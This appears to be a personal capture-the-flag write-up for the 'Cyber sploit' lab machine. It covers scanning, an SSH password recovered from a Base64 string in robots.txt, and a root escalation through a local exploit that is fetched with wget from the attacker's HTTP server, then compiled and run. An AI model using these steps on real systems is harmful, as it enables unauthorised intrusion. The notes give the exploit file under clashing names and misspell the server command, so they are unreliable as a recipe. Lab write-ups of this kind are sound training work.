Cyber sploit solution

1st stage 
   reconnaisance
command used : nmap -sC -sV -p- $IP

2nd step 
	exploration at port 80
	found robot.txt
	content (maybe Base64 ) Y3liZXJzcGxvaXR7eW91dHViZS5jb20vYy9jeWJlcnNwbG9pdH0=
	decoded ans : cybersploit{youtube.com/c/cybersploit} (maybe the flag) but this was ssh password
on http port 80 source code viewed 
<--------username : itsskv---------->
logged into ssh 
ssh itsskv@$IP 
pass word cybersploit{youtube.com/c/cybersploit}
found first flag in file local.txt

2nd stage of exploit completes (Gaining access)

3rd stage :
privelige escalation 
	based on victim os ie (ubuntu 12.04.5) overlays exploit 37297.c 
      simple http server started at attacker
	python -m simpleHttpserver 5000
on victim machine
	getting this exploit
	wget http://tun0 (attackers Ip):5000/37292.txt
 output :
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/plain]
Saving to: `37292.c'

100%[========================================================>] 5,119 

 now Final stage of attack
 run exploit 
 gcc 37293.c -o expl
 ./expl
 now attacker has full control over machine
 whoami
ans : root
	located finalflag.txt in root diretory
	read it
